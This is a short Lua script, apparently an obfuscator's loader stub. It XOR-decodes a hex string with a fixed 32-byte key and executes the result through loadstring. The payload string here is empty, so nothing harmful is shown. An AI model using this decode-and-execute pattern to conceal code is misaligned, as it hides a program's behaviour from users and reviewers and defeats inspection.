local k={18,26,182,31,153,250,135,110,170,190,200,121,50,106,5,232,21,36,121,86,231,173,6,199,90,97,28,54,76,105,222,155}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
